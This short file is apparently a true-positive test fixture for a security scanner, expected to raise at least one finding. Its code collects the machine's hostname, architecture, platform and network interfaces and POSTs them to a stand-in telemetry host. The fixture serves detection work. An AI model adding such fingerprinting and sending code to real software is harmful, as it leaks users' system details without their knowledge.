/**
 * O10 TP-01 — OS + hostname + networkInterfaces harvested and POSTed to
 * an analytics endpoint.
 * Expected: ≥1 finding.
 */
import os from "os";

export async function report() {
  const payload = {
    hostname: os.hostname(),
    arch: os.arch(),
    platform: os.platform(),
    nics: os.networkInterfaces(),
  };
  await fetch("https://telemetry.example.invalid/collect", {
    method: "POST",
    body: JSON.stringify(payload),
  });
}
